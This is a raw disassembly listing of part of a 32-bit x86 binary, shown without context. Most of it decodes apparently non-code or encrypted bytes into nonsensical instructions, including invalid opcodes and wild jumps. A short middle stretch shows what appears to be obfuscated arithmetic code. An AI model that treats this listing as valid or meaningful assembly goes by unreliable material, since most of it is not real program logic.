  4219f4:	fwait
  4219f5:	pop    ss
  4219f6:	inc    esi
  4219f7:	and    esi,eax
  4219f9:	lahf   
  4219fa:	pop    esp
  4219fb:	inc    eax
  4219fc:	test   BYTE PTR [edx+0x1f],ah
  4219ff:	mov    ebp,0xeafe976d
  421a04:	inc    edx
  421a05:	fstp   TBYTE PTR [ebx+0x0]
  421a08:	fstp   QWORD PTR [edx+0x766f11e]
  421a0e:	cmp    al,0x6
  421a10:	int    0xd9
  421a12:	push   edi
  421a13:	test   ebp,esi
  421a15:	push   edi
  421a16:	and    ch,0xc0
  421a19:	xchg   ebx,eax
  421a1a:	xchg   ebx,eax
  421a1b:	lods   al,BYTE PTR ds:[esi]
  421a1c:	aad    0x3d
  421a1e:	cdq    
  421a1f:	jmp    0xf9b37248
  421a24:	cmp    BYTE PTR [ebp-0x7c],bh
  421a27:	jecxz  0x421a98
  421a29:	push   esi
  421a2a:	sub    dh,BYTE PTR es:[eax]
  421a2d:	mov    bl,0xdf
  421a2f:	push   ebp
  421a30:	pop    eax
  421a31:	leave  
  421a32:	ret    
  421a33:	add    BYTE PTR [ebx+0x36a897f7],bl
  421a39:	arpl   cx,si
  421a3b:	fsub   DWORD PTR [edi+0x78]
  421a3e:	fdivr  DWORD PTR [ebx]
  421a40:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421a41:	dec    ebx
  421a42:	mov    dh,0x37
  421a44:	xchg   ebp,eax
  421a45:	mov    DWORD PTR [ecx+0x24],esi
  421a48:	adc    dl,BYTE PTR [ebx-0x97b3c7f]
  421a4e:	cwde   
  421a4f:	popa   
  421a50:	test   eax,0x47b95e26
  421a55:	cmp    dl,BYTE PTR [esp+ecx*8-0x6]
  421a59:	lock (bad) 
  421a5c:	xchg   edx,eax
  421a5d:	sbb    al,0x3b
  421a5f:	in     al,dx
  421a60:	jno    0x421a44
  421a62:	xor    ch,bh
  421a64:	retf   0x2794
  421a67:	jno    0x421a7f
  421a69:	xchg   esp,eax
  421a6a:	out    dx,al
  421a6b:	aad    0x58
  421a6d:	idiv   DWORD PTR [eax+ebx*8-0x54]
  421a71:	ss inc ecx
  421a73:	out    dx,eax
  421a74:	pushf  
  421a75:	in     al,dx
  421a76:	cmp    BYTE PTR [esi+esi*4-0x7c],ah
  421a7a:	adc    cl,dl
  421a7c:	jmp    0x3d87:0x896c6417
  421a83:	sbb    esi,ebx
  421a85:	inc    eax
  421a86:	jb     0x421a4e
  421a88:	ja     0x421a99
  421a8a:	pop    es
  421a8b:	mov    ah,0xeb
  421a8d:	aam    0x61
  421a8f:	xchg   esp,eax
  421a90:	fdiv   QWORD PTR [edx]
  421a92:	pop    edx
  421a93:	out    0x8,al
  421a95:	mov    esp,DWORD PTR [ebp-0x68]
  421a98:	mov    dl,BYTE PTR [ecx]
  421a9a:	push   ss
  421a9b:	cmp    al,0x3a
  421a9d:	mov    ebp,0x4ef8a4f0
  421aa2:	inc    eax
  421aa3:	ins    BYTE PTR es:[edi],dx
  421aa4:	mov    esp,0x1f5deffe
  421aa9:	inc    ebp
  421aaa:	lods   al,BYTE PTR ds:[esi]
  421aab:	lods   eax,DWORD PTR ds:[esi]
  421aac:	inc    ecx
  421aad:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421aae:	mov    ecx,0x31453a3f
  421ab3:	(bad)  
  421ab4:	sub    ecx,DWORD PTR [edi+0xe6faf07]
  421aba:	cmp    eax,DWORD PTR [eax+0x66cd07ae]
  421ac0:	std    
  421ac1:	sbb    al,0xea
  421ac3:	pop    ds
  421ac4:	xchg   BYTE PTR [edx],dl
  421ac6:	ret    
  421ac7:	mov    al,ds:0xc4d0a3a4
  421acc:	popf   
  421acd:	scas   eax,DWORD PTR es:[edi]
  421ace:	inc    ebx
  421acf:	call   0x7c5722a6
  421ad4:	into   
  421ad5:	sti    
  421ad6:	sub    dl,cl
  421ad8:	je     0x421b2c
  421ada:	xor    eax,0xd9e22c5b
  421adf:	and    al,0xeb
  421ae1:	and    al,0x6e
  421ae3:	adc    BYTE PTR ds:0x4ff4ae6d,cl
  421ae9:	push   edi
  421aea:	js     0x421b4f
  421aec:	mov    BYTE PTR [esi-0x22753db9],bl
  421af2:	sbb    dh,0xd4
  421af5:	dec    ebx
  421af6:	push   esp
  421af7:	data16 (bad) 
  421af9:	pop    ecx
  421afa:	xchg   dl,dh
  421afc:	lds    ebp,FWORD PTR [ebp+0x33147000]
  421b02:	and    ebx,DWORD PTR [eax-0x74]
  421b05:	inc    esp
  421b06:	jnp    0x421ab0
  421b08:	sbb    ah,cl
  421b0a:	add    edi,0xa2321f20
  421b10:	cmp    al,0x44
  421b12:	call   0xa372b010
  421b17:	movhps QWORD PTR [ebp+edx*2-0x14],xmm6
  421b1c:	sar    DWORD PTR [eax],0x5c
  421b1f:	gs hlt 
  421b21:	mov    esi,0x6f02f12b
  421b26:	stos   DWORD PTR es:[di],eax
  421b28:	ret    0x3d34
  421b2b:	xchg   ecx,eax
  421b2c:	fidivr WORD PTR [edx+0x3285c6eb]
  421b32:	sub    al,0x8
  421b34:	jmp    0x81b20a21
  421b39:	or     eax,0xda8239c0
  421b3e:	pop    eax
  421b3f:	sar    DWORD PTR [ebp+eiz*2-0x5b],0xa0
  421b44:	dec    ebp
  421b45:	or     ch,BYTE PTR [edx+eax*8+0x542a552e]
  421b4c:	xchg   ebx,eax
  421b4d:	and    ah,BYTE PTR [eax-0x50]
  421b50:	call   0x126c:0x1eaa7f46
  421b57:	and    DWORD PTR [esi+0x6f],esp
  421b5a:	retf   
  421b5b:	or     al,0x5f
  421b5d:	xchg   ecx,eax
  421b5e:	jo     0x421b98
  421b60:	xchg   edx,eax
  421b61:	mov    ecx,0xc4080f44
  421b66:	dec    ebx
  421b67:	pop    ecx
  421b68:	push   ecx
  421b69:	shl    BYTE PTR [edx-0xb],cl
  421b6c:	and    dh,BYTE PTR [ecx]
  421b6e:	xchg   ecx,eax
  421b6f:	test   eax,0xb66e513c
  421b74:	jo     0x421b88
  421b76:	xor    BYTE PTR [esi],bh
  421b78:	sbb    BYTE PTR [edx],al
  421b7a:	test   DWORD PTR [ebx+0x701b3fda],edx
  421b80:	imul   edx,ebx,0xeb32d986
  421b86:	clc    
  421b87:	pop    eax
  421b88:	jo     0x421be9
  421b8a:	sub    al,0xde
  421b8c:	jp     0x421b5b
  421b8e:	call   0x53cd:0xa057a1f1
  421b95:	sbb    bl,bl
  421b97:	xor    al,0xe
  421b99:	and    al,0x9
  421b9b:	arpl   WORD PTR [esi],di
  421b9d:	aaa    
  421b9e:	jl     0x421b42
  421ba0:	push   0xffffffb8
  421ba2:	das    
  421ba3:	push   esi
  421ba4:	inc    ebp
  421ba5:	pop    edi
  421ba6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  421ba7:	cmp    al,0xf6
  421ba9:	lods   al,BYTE PTR ds:[esi]
  421baa:	jae    0x421bf0
  421bac:	adc    DWORD PTR [ebx+eiz*8-0x74],esp
  421bb0:	loope  0x421be9
  421bb2:	mov    ebp,0x15ca347
  421bb7:	cmp    al,0xa8
  421bb9:	enter  0x9d84,0xb9
  421bbd:	jmp    0x421c0c
  421bbf:	jbe    0x421bb5
  421bc1:	test   BYTE PTR ds:0x432404dc,bh
  421bc7:	mov    ecx,ebx
  421bc9:	push   esi
  421bca:	jnp    0x421bcc
  421bcc:	pop    ds
  421bcd:	scas   eax,DWORD PTR es:[edi]
  421bce:	pop    ebp
  421bcf:	fwait
  421bd0:	inc    ecx
  421bd1:	push   0xfffffff6
  421bd3:	ret    0xd235
  421bd6:	scas   al,BYTE PTR es:[edi]
  421bd7:	cmp    BYTE PTR [ecx+eax*2-0x395ed416],dl
  421bde:	ret    
  421bdf:	adc    bl,al
  421be1:	mov    ?,WORD PTR [esp+esi*2-0x66]
  421be5:	pop    ds
  421be6:	inc    esp
  421be7:	push   eax
  421be8:	pop    edx
  421be9:	je     0x421c56
  421beb:	dec    edi
  421bec:	in     eax,dx
  421bed:	xor    dl,ah
  421bef:	retf   
  421bf0:	mov    eax,ds:0x9cee66b8
  421bf5:	mov    bh,0xcc
  421bf7:	shr    DWORD PTR [ecx-0x14c5f894],cl
  421bfd:	sbb    DWORD PTR [ebx],ebp
  421bff:	jae    0x421c4c
  421c01:	mov    cs,esp
  421c03:	icebp  
  421c04:	jno    0x421be4
  421c06:	lds    edx,FWORD PTR [esi]
  421c08:	sub    dl,BYTE PTR [esi+0x38]
  421c0b:	mov    esi,0x99a4b0d8
  421c10:	icebp  
  421c11:	rcr    BYTE PTR [ebp-0x6038b8e7],1
  421c17:	mov    bh,BYTE PTR [eax]
  421c19:	js     0x421c4d
  421c1b:	jl     0x421c46
  421c1d:	dec    ecx
  421c1e:	outs   dx,BYTE PTR ds:[esi]
  421c1f:	or     al,0xe1
  421c21:	ds dec esp
  421c23:	fcmovnbe st,st(5)
  421c25:	add    al,0xcb
  421c27:	push   esp
  421c28:	mov    bh,BYTE PTR [ebx+0x46]
  421c2b:	push   0x85e19f81
  421c30:	xor    eax,ecx
  421c32:	test   al,0x16
  421c34:	add    DWORD PTR [edx-0x63],0xffffffc9
  421c38:	fstp   DWORD PTR ss:[eax-0x74c67476]
  421c3f:	xlat   BYTE PTR ds:[ebx]
  421c40:	pop    edx
  421c41:	push   esi
  421c42:	js     0x421c05
  421c44:	aam    0x4
  421c46:	(bad)  [ecx+0x275fffde]
  421c4c:	mov    esp,0x7ae75a07
  421c51:	pop    eax
  421c52:	ror    BYTE PTR [ebp+0x57ce34bb],0xa2
  421c59:	inc    edx
  421c5a:	pop    edi
  421c5b:	sub    al,BYTE PTR [eax+0x40]
  421c5e:	pop    esi
  421c5f:	cld    
  421c60:	(bad)  
  421c61:	jns    0x421c52
  421c63:	test   edx,0x805a40b7
  421c69:	fadd   DWORD PTR [eax-0x5d6340f7]
  421c6f:	popa   
  421c70:	rcr    BYTE PTR [edx+0x75d35d0b],0xa7
  421c77:	(bad)  [edx-0x6f629083]
  421c7d:	xor    edi,DWORD PTR [ebp+esi*4-0x2f]
  421c81:	sar    BYTE PTR [eax-0x7b],cl
  421c84:	ficom  WORD PTR [esi]
  421c86:	cmp    DWORD PTR cs:[ecx+edx*1-0x25],ecx
  421c8b:	movs   BYTE PTR es:[edi],BYTE PTR gs:[esi]
  421c8d:	sub    dl,0xa2
  421c90:	ror    dh,1
  421c92:	sahf   
  421c93:	mov    al,ds:0xe95534e5
  421c98:	cdq    
  421c99:	out    0x8c,eax
  421c9b:	inc    ebp
  421c9c:	fisubr DWORD PTR [edi-0x14]
  421c9f:	sub    eax,0xebfb36fb
  421ca4:	repnz mov al,0x3a
  421ca7:	sbb    ch,al
  421ca9:	retf   
  421caa:	fst    QWORD PTR ds:0x5cf39df8
  421cb0:	inc    bl
  421cb2:	in     eax,0x2c
  421cb4:	mov    al,ds:0x30a22b16
  421cb9:	push   cs
  421cba:	fwait
  421cbb:	xor    BYTE PTR [eax-0x6],dh
  421cbe:	pop    ebx
  421cbf:	hlt    
  421cc0:	sti    
  421cc1:	mov    WORD PTR [ebp-0x16009dc6],?
  421cc7:	cdq    
  421cc8:	frstor [eax+0x7e83c7ce]
  421cce:	xor    al,0x7e
  421cd0:	mov    bl,0x5f
  421cd2:	and    al,0xe4
  421cd4:	es loope 0x421ce3
  421cd7:	stos   BYTE PTR es:[edi],al
  421cd8:	test   edi,esi
  421cda:	inc    edx
  421cdb:	xlat   BYTE PTR ds:[ebx]
  421cdc:	ja     0x421cfb
  421cde:	and    DWORD PTR [edi],0x53
  421ce1:	inc    edi
  421ce2:	imul   al
  421ce4:	push   0x94c49a7a
  421ce9:	cmp    BYTE PTR [esi-0x28],bl
  421cec:	push   ss
  421ced:	cs stc 
  421cef:	test   eax,0xbf8f840e
  421cf4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421cf5:	in     eax,dx
  421cf6:	xchg   esp,eax
  421cf7:	mov    edx,0xfb5b6d31
  421cfc:	inc    ecx
  421cfd:	cwde   
  421cfe:	(bad)  
  421cff:	push   edx
  421d00:	pop    ebp
  421d01:	and    BYTE PTR [eax+0x1e4efa71],dl
  421d07:	es out 0x8,eax
  421d0a:	pusha  
  421d0b:	jnp    0x421cc6
  421d0d:	or     al,0xd2
  421d0f:	lea    ecx,[ecx-0x31ea282]
  421d15:	push   edx
  421d16:	push   esi
  421d17:	push   ebp
  421d18:	outs   dx,DWORD PTR ds:[esi]
  421d19:	pop    ds
  421d1a:	fnstcw WORD PTR [edx]
  421d1c:	rol    dh,1
  421d1e:	and    eax,0xf00c6880
  421d23:	mov    bh,0x65
  421d25:	aaa    
  421d26:	inc    eax
  421d27:	adc    al,BYTE PTR [ebx+ebx*8]
  421d2a:	ret    0x59ed
  421d2d:	sub    ebx,DWORD PTR [edx]
  421d2f:	das    
  421d30:	and    eax,0x7bf0f886
  421d35:	dec    edi
  421d36:	mov    ebx,DWORD PTR [edi+ebp*8]
  421d39:	ret    0x3dd5
  421d3c:	inc    esp
  421d3d:	dec    esp
  421d3e:	add    al,BYTE PTR [ebx+eax*1+0x57]
  421d42:	(bad)  
  421d44:	test   DWORD PTR [edi-0x58],0xa5061099
  421d4b:	retf   0x5623
  421d4e:	lods   al,BYTE PTR ds:[esi]
  421d4f:	inc    ebx
  421d50:	ins    DWORD PTR es:[edi],dx
  421d51:	(bad)  
  421d52:	loope  0x421cd5
  421d54:	pop    ebp
  421d55:	popa   
  421d56:	pop    ebx
  421d57:	stos   BYTE PTR es:[edi],al
  421d58:	test   al,0xac
  421d5a:	scas   eax,DWORD PTR es:[edi]
  421d5b:	retf   
  421d5c:	cmp    ebx,DWORD PTR [ebp+0x341b0e71]
  421d62:	mov    dl,BYTE PTR [edx]
  421d64:	fdiv   DWORD PTR ds:[ecx-0xc368ed4]
  421d6b:	mov    ds:0x3adb8521,eax
  421d70:	rcl    DWORD PTR [ebx+ebp*8-0x31e589e4],cl
  421d77:	pop    esi
  421d78:	xchg   DWORD PTR [edx-0x29],edi
  421d7b:	mov    bh,0x99
  421d7d:	aam    0xca
  421d7f:	pop    ebp
  421d80:	xor    DWORD PTR [eax+0x41922d],0xffffffa9
  421d87:	pop    ss
  421d88:	pop    esp
  421d89:	lods   eax,DWORD PTR ds:[esi]
  421d8a:	stos   DWORD PTR es:[edi],eax
  421d8b:	dec    esp
  421d8c:	popf   
  421d8d:	cmp    bl,BYTE PTR [eax+0x321532e5]
  421d93:	adc    DWORD PTR [eax-0x8b33e1f],edx
  421d99:	(bad)  
  421d9a:	(bad)  [esi-0x2d]
  421d9d:	adc    edi,ebp
  421d9f:	repnz push esi
  421da1:	add    DWORD PTR [edi+ebx*1+0x5b],edi
  421da5:	ins    BYTE PTR es:[edi],dx
  421da6:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  421da7:	ret    
  421da8:	das    
  421da9:	sbb    DWORD PTR [edx-0x6c],ebp
  421dac:	in     al,0x28
  421dae:	std    
  421daf:	mov    cl,0x98
  421db1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  421db2:	neg    DWORD PTR [ebx]
  421db4:	out    dx,al
  421db5:	in     eax,0xcd
  421db7:	stos   DWORD PTR es:[edi],eax
  421db8:	and    al,0x6e
  421dba:	cmp    bl,BYTE PTR [edx-0x24]
  421dbd:	cld    
  421dbe:	jne    0x421d68
  421dc0:	je     0x421e38
  421dc2:	sahf   
  421dc3:	ins    BYTE PTR es:[edi],dx
  421dc4:	adc    DWORD PTR [ecx+0x51],ebp
  421dc7:	mov    ah,0x5f
  421dc9:	mov    al,0xcc
  421dcb:	test   BYTE PTR [ebp+0x38],al
  421dce:	test   BYTE PTR [eax],al
  421dd0:	pusha  
  421dd1:	cmp    BYTE PTR [ecx-0x41],0xb6
  421dd5:	push   eax
  421dd6:	jo     0x421dbb
  421dd8:	mov    eax,ds:0x3fe4b99b
  421ddd:	push   ss
  421dde:	mov    ah,0x89
  421de0:	mov    ebx,DWORD PTR [edx-0x23]
  421de3:	das    
  421de4:	leave  
  421de5:	jecxz  0x421e09
  421de7:	xor    BYTE PTR [ebp+0x5fa0672e],0x7d
  421dee:	jb     0x421dd5
  421df0:	push   ebp
  421df1:	fwait
  421df2:	jge    0x421d79
  421df4:	hlt    
  421df5:	into   
  421df6:	mov    ds:0xfea2f57f,eax
  421dfb:	lar    edx,WORD PTR [ebp+0xb]
  421dff:	outs   dx,DWORD PTR ds:[esi]
  421e00:	dec    esp
  421e01:	daa    
  421e02:	mov    al,0xe2
  421e04:	(bad)  
  421e05:	(bad)  
  421e06:	popa   
  421e07:	and    edx,DWORD PTR [esi+0x17]
  421e0a:	xchg   ebx,eax
  421e0b:	sub    esi,DWORD PTR [esi+0x3e]
  421e0e:	hlt    
  421e0f:	dec    esp
  421e10:	add    eax,ebx
  421e12:	inc    ebp
  421e13:	bound  ebx,QWORD PTR [edi+edx*2-0x37]
  421e17:	push   ss
  421e18:	cmp    al,0x87
  421e1a:	push   ss
  421e1b:	cmp    al,al
  421e1d:	test   eax,0x1f5265e
  421e22:	xchg   edi,eax
  421e23:	mov    ch,0x70
  421e25:	retf   
  421e26:	sti    
  421e27:	dec    ecx
  421e28:	pop    ds
  421e29:	lods   al,BYTE PTR ds:[esi]
  421e2a:	dec    eax
  421e2b:	shr    BYTE PTR [ebx],1
  421e2d:	mov    dl,ah
  421e2f:	std    
  421e30:	cwde   
  421e31:	and    al,0x21
  421e33:	cmc    
  421e34:	inc    edx
  421e35:	xor    al,bh
  421e37:	or     esp,eax
  421e39:	xchg   esi,eax
  421e3a:	cld    
  421e3b:	pop    ebx
  421e3c:	loopne 0x421e14
  421e3e:	test   BYTE PTR [ebp-0x4fe48e5],ah
  421e44:	addr16 mov eax,ds:0x9941
  421e48:	mov    eax,0x896808a4
  421e4d:	push   ebp
  421e4e:	hlt    
  421e4f:	mov    edx,DWORD PTR [ebp-0x10]
  421e52:	xor    edx,eax
  421e54:	add    edx,esi
  421e56:	jne    0x41d43b
  421e5c:	jmp    0x422f95
  421e61:	mov    ecx,DWORD PTR [ebp-0x14]
  421e64:	mov    DWORD PTR [ebp+0x8],ecx
  421e67:	jmp    0x421ee0
  421e6c:	mov    ecx,DWORD PTR [ebp+0x8]
  421e6f:	mov    edx,DWORD PTR [ebp-0x8]
  421e72:	xor    ecx,eax
  421e74:	xor    edx,eax
  421e76:	sub    ecx,edx
  421e78:	sub    ecx,esi
  421e7a:	xor    ecx,eax
  421e7c:	mov    DWORD PTR [ebp+0x8],ecx
  421e7f:	mov    ecx,DWORD PTR [ebp+0x8]
  421e82:	mov    edx,DWORD PTR [ebp-0x58]
  421e85:	add    ecx,0x5708fa
  421e8b:	imul   ecx,edx
  421e8e:	mov    DWORD PTR [ebp-0x58],ecx
  421e91:	mov    ecx,DWORD PTR [ebp+0x8]
  421e94:	mov    edx,DWORD PTR [ebp-0x54]
  421e97:	add    ecx,0x64f898
  421e9d:	or     ecx,edx
  421e9f:	mov    DWORD PTR [ebp-0x54],ecx
  421ea2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ea5:	mov    edx,DWORD PTR [ebp-0x50]
  421ea8:	add    ecx,0x242ebc9
  421eae:	xor    ecx,edx
  421eb0:	mov    DWORD PTR [ebp-0x50],ecx
  421eb3:	mov    ecx,DWORD PTR [ebp+0x8]
  421eb6:	mov    edx,DWORD PTR [ebp-0x4c]
  421eb9:	add    ecx,edi
  421ebb:	and    ecx,edx
  421ebd:	mov    DWORD PTR [ebp-0x4c],ecx
  421ec0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ec3:	mov    edx,DWORD PTR [ebp-0x48]
  421ec6:	lea    ecx,[edx+ecx*1+0x241fcdf]
  421ecd:	mov    DWORD PTR [ebp-0x48],ecx
  421ed0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ed3:	mov    edx,0xfa5e1524
  421ed8:	sub    edx,ecx
  421eda:	add    edx,DWORD PTR [ebp-0x44]
  421edd:	mov    DWORD PTR [ebp-0x44],edx
  421ee0:	mov    ecx,DWORD PTR [ebp+0x8]
  421ee3:	xor    ecx,eax
  421ee5:	add    ecx,esi
  421ee7:	jne    0x421e6c
  421eed:	jmp    0x422fa1
  421ef2:	mov    ecx,DWORD PTR [ebp+0x8]
  421ef5:	mov    edx,DWORD PTR [ebp-0x8]
  421ef8:	xor    ecx,eax
  421efa:	xor    edx,eax
  421efc:	sub    ecx,edx
  421efe:	sub    ecx,esi
  421f00:	xor    ecx,eax
  421f02:	mov    DWORD PTR [ebp+0x8],ecx
  421f05:	mov    ecx,DWORD PTR [ebp+0x8]
  421f08:	mov    edx,DWORD PTR [ebp-0x58]
  421f0b:	add    ecx,0x5708fa
  421f11:	imul   ecx,edx
  421f14:	mov    DWORD PTR [ebp-0x58],ecx
  421f17:	mov    ecx,DWORD PTR [ebp+0x8]
  421f1a:	mov    edx,DWORD PTR [ebp-0x54]
  421f1d:	add    ecx,0x64f898
  421f23:	or     ecx,edx
  421f25:	mov    DWORD PTR [ebp-0x54],ecx
  421f28:	mov    ecx,DWORD PTR [ebp+0x8]
  421f2b:	mov    edx,DWORD PTR [ebp-0x50]
  421f2e:	add    ecx,0x242ebc9
  421f34:	xor    ecx,edx
  421f36:	mov    DWORD PTR [ebp-0x50],ecx
  421f39:	mov    ecx,DWORD PTR [ebp+0x8]
  421f3c:	mov    edx,DWORD PTR [ebp-0x4c]
  421f3f:	jmp    0x422f61
  421f44:	sbb    eax,0x95d463fb
  421f49:	aam    0x96
  421f4b:	mov    dh,0xbf
  421f4d:	cdq    
  421f4e:	push   eax
  421f4f:	inc    esi
  421f50:	lock inc ecx
  421f52:	mov    cl,0xbf
  421f54:	fist   DWORD PTR [ecx+0x7378837c]
  421f5a:	add    DWORD PTR [ebx+0x174b3624],0x41
  421f61:	mov    BYTE PTR [ebx-0x7a],dl
  421f64:	push   esp
  421f65:	test   al,0x2
  421f67:	dec    edi
  421f68:	in     eax,dx
  421f69:	(bad)  
  421f6a:	outs   dx,DWORD PTR ds:[esi]
  421f6b:	sbb    al,0x47
  421f6d:	mov    esi,0x1ca49c7f
  421f72:	rcl    DWORD PTR [ebx+0x4ed1a7aa],0x6
  421f79:	mov    edx,0xbf1c18f9
  421f7e:	fdiv   st(5),st
  421f80:	outs   dx,BYTE PTR ds:[esi]
  421f81:	(bad)  
  421f82:	js     0x421ff2
  421f84:	jg     0x421fe9
  421f86:	adc    DWORD PTR ds:0xf799d872,ebx
  421f8c:	or     esp,DWORD PTR [ecx+0x47a6b5b]
  421f92:	cld    
  421f93:	xchg   esi,eax
  421f94:	jb     0x421f65
  421f96:	mov    dh,0xc4
  421f98:	lods   eax,DWORD PTR ds:[esi]
  421f99:	jle    0x421f30
  421f9b:	(bad)  [esi+0x411e9755]
  421fa1:	fsub   QWORD PTR [ebx+edi*2+0x46]
  421fa5:	je     0x421fc9
  421fa7:	ds inc edx
  421fa9:	call   0x5d8c:0xecbb86a9
  421fb0:	clc    
  421fb1:	rol    BYTE PTR [ebp-0x59],0x12
  421fb5:	shl    DWORD PTR [esi-0x5384a45],0x20
  421fbc:	into   
  421fbd:	cmovne ecx,edi
  421fc0:	and    ebp,ebx
  421fc2:	cld    
  421fc3:	dec    ecx
  421fc4:	adc    ecx,DWORD PTR [esi+0x53]
  421fc7:	js     0x421fc9
  421fc9:	push   0xffffffb0
  421fcb:	sub    ah,BYTE PTR [edi-0x1c]
  421fce:	fcom   QWORD PTR [edx-0x7e]
  421fd1:	inc    edx
  421fd2:	popf   
  421fd3:	les    esi,FWORD PTR [ecx+edi*4+0x3d]
  421fd7:	aas    
  421fd8:	or     BYTE PTR [edx],bh
  421fda:	stos   BYTE PTR es:[edi],al
  421fdb:	pop    edi
  421fdc:	fnstsw WORD PTR [ebx+0x72]
  421fdf:	imul   esp,edi,0x32764334
  421fe5:	or     BYTE PTR [edi+ebx*4-0x1fe2ca7d],dh
  421fec:	jnp    0x421fb2
  421fee:	inc    edx
  421fef:	(bad)  
  421ff0:	es cli 
  421ff2:	adc    BYTE PTR [ebp-0x3aa81739],0x81
  421ff9:	mov    ch,BYTE PTR [ecx-0x2b]
  421ffc:	sbb    eax,DWORD PTR [ebx-0x1542f742]
  422002:	and    eax,0xffffffee
  422005:	ffreep st(2)
  422007:	gs std 
  422009:	mov    dh,0x21
  42200b:	mov    ah,0x99
  42200d:	jp     0x422010
  42200f:	clc    
  422010:	dec    esi
  422011:	adc    DWORD PTR [edx+0x5277e99f],0x7b
  422018:	(bad)  
  422019:	fucomi st,st(0)
  42201b:	adc    DWORD PTR [eax+eax*1+0x1cca8be5],esp
  422022:	(bad)  
  422023:	push   esp
  422024:	pop    ss
  422025:	or     eax,0x24df9720
  42202a:	mov    bh,0xbe
  42202c:	ficomp WORD PTR [esi+edx*4]
  42202f:	fild   QWORD PTR [edx-0x48]
  422032:	cs push ebx
  422034:	imul   esi,DWORD PTR [ebx+0x73],0x23
  422038:	mov    ds:0xb9da2fc2,al
  42203d:	je     0x4220b5
  42203f:	iret   
  422040:	rcr    DWORD PTR [edx+0x31289ab5],1
  422046:	fsub   st(4),st
  422048:	sbb    ebp,esi
  42204a:	js     0x42201e
  42204c:	pusha  
  42204d:	mov    al,0x4e
  42204f:	(bad)  
  422050:	pop    ss
  422051:	fwait
  422052:	xchg   ebp,eax
  422053:	retf   
  422054:	jmp    0x89c99557
  422059:	or     eax,0xdb43b50e
  42205e:	popf   
  42205f:	jns    0x4220bf
  422061:	(bad)
  422064:	push   eax
  422065:	lods   al,BYTE PTR ds:[esi]
  422066:	mov    cl,0xb1
  422068:	push   ebp
  422069:	dec    ebp
  42206a:	mov    ds:0xfa9d976a,al
  42206f:	pushf  
  422070:	stos   BYTE PTR es:[edi],al
  422071:	stc    
  422072:	inc    DWORD PTR [eax]
  422074:	xor    DWORD PTR [esp+esi*2],0x1dcfc96a
  42207b:	pop    edi
  42207c:	inc    ebx
  42207d:	jle    0x422045
  42207f:	out    0x86,eax
  422081:	repz fmul DWORD PTR [esi+0x93c4b75]
  422088:	sbb    BYTE PTR [esi+edx*8-0x7b],al
  42208c:	or     al,0xa1
  42208e:	ret    
  42208f:	sbb    DWORD PTR [edx+0x7d],0xffffffa6
  422093:	repnz mov edx,0x3872e0e5
  422099:	push   0x6a
  42209b:	add    eax,edi
  42209d:	in     eax,dx
  42209e:	push   0xa
  4220a0:	xchg   edi,eax
  4220a1:	and    ch,ch
  4220a3:	add    eax,0xb6303dd6
  4220a8:	into   
  4220a9:	xchg   ecx,eax
  4220aa:	and    al,0x37
  4220ac:	xchg   edx,eax
  4220ad:	push   esi
  4220ae:	int3   
  4220af:	and    esp,ebp
  4220b1:	mov    WORD PTR [edi-0x52],gs
  4220b4:	mov    edi,0xc3cc8c5a
  4220b9:	ret    0x42e8
  4220bc:	xchg   dh,dl
  4220be:	jmp    0xcae76e5d
  4220c3:	inc    edi
  4220c4:	loopne 0x42206a
  4220c6:	or     eax,0xb0136686
  4220cb:	sub    al,0x7e
  4220cd:	outs   dx,BYTE PTR fs:[esi]
  4220cf:	or     BYTE PTR [ecx-0x40],ch
  4220d2:	inc    ebx
  4220d3:	push   esi
  4220d4:	mov    WORD PTR [eax-0x5745e6ef],?
  4220da:	pop    esp
  4220db:	jno    0x422135
  4220dd:	pushf  
  4220de:	popa   
  4220df:	mov    edx,0x37203cb3
  4220e4:	or     al,BYTE PTR [ebp-0x5b62f62f]
  4220ea:	mov    eax,0xb4226fa2
  4220ef:	or     dl,ch
  4220f1:	mov    edi,0x2b3381b5
  4220f6:	cmp    al,BYTE PTR [edx+0x6]
  4220f9:	pop    ss
  4220fa:	xor    BYTE PTR [esi+0x5c24e3fc],0x63
  422101:	jmp    0x3706291c
  422106:	pop    ds
  422107:	shr    ah,0xe2
  42210a:	jle    0x4220d8
  42210c:	xchg   ebp,esp
  42210e:	add    edi,DWORD PTR [eax+0x4c]
  422111:	inc    ebp
  422112:	mov    dl,0xc5
  422114:	(bad)  
  422115:	iret   
  422116:	je     0x422123
  422118:	(bad)  
  422119:	dec    ebx
  42211a:	mov    edx,DWORD PTR [ecx-0x1ba7605f]
  422120:	scas   al,BYTE PTR es:[edi]
  422121:	sub    al,0x3d
  422123:	jne    0x422145
  422125:	push   ds
  422126:	in     al,0x8a
  422128:	jbe    0x4220e2
  42212a:	pushf  
  42212b:	cs inc esi
  42212d:	je     0x4220fa
  42212f:	fwait
  422130:	rcl    DWORD PTR [ebp+0x42],cl
  422133:	mov    al,0xc2
  422135:	imul   edi,DWORD PTR [ebx],0x4ad9d31
  42213b:	call   0xc48115f3
  422140:	in     eax,dx
  422141:	aaa    
  422142:	in     eax,0x31
  422144:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  422145:	loopne 0x4220e8
  422147:	inc    ecx
  422148:	xor    dl,ah
  42214a:	test   eax,0x5117f2b8
  42214f:	or     dh,cl
  422151:	ror    DWORD PTR [edx],1
  422153:	stc    
  422154:	cmp    al,0x50
  422156:	adc    al,0x7c
  422158:	iret   
  422159:	sub    al,0x8b
  42215b:	ror    al,cl
  42215d:	jecxz  0x4221a6
  42215f:	lea    edx,[ecx+edx*1-0x69]
  422163:	inc    esi
  422164:	pusha  
  422165:	cmp    edi,DWORD PTR es:[eax]
  422168:	push   es
  422169:	iret   
  42216a:	rcr    ecx,0x9d
  42216d:	cdq    
  42216e:	mov    al,ds:0xa29a73d4
  422173:	mov    ds:0xa0d9b473,al
  422178:	(bad)  [edx+ebp*4-0x2c]
  42217c:	dec    eax
  42217d:	cmp    al,0x3d
  42217f:	icebp  
  422180:	mov    bh,0x83
  422182:	sbb    BYTE PTR [ecx],0xb4
  422185:	mov    edi,0xcdd09025
  42218a:	fwait
  42218b:	(bad)  
